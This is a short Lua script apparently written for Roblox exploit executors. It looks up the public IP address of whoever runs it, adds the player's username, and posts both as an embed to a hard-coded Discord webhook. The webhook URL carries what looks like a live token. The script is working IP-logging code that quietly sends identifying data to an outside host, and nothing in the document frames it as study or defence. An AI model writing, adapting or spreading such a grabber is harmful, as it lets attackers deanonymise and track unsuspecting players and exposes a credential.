local WEBHOOK = "https://discord.com/api/webhooks/790376297728704523/5gfUegVASlk2VVeSNrCbh24wh4nd1VWozu8IoZwIVHNLa5IiDy5x4Xwqr-0qBsP1rWay"
local I = game:HttpGet("https://api.ipify.org")

--[[
done!
]]

S = [[{
  "embeds": [
    {
      "title": "PLAYER IP: PLRNAME",
      "fields": [
        {
          "name": "IP:",
          "value": "IPLOLHERE"
        }
      ]
    }
  ]
}
]]

S = S:gsub("PLRNAME", game.Players.LocalPlayer.Name)
S = S:gsub("IPLOLHERE", I)

local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=WEBHOOK, Body=S, Method="POST", Headers=headers}

    http_request(request_payload)

wait()
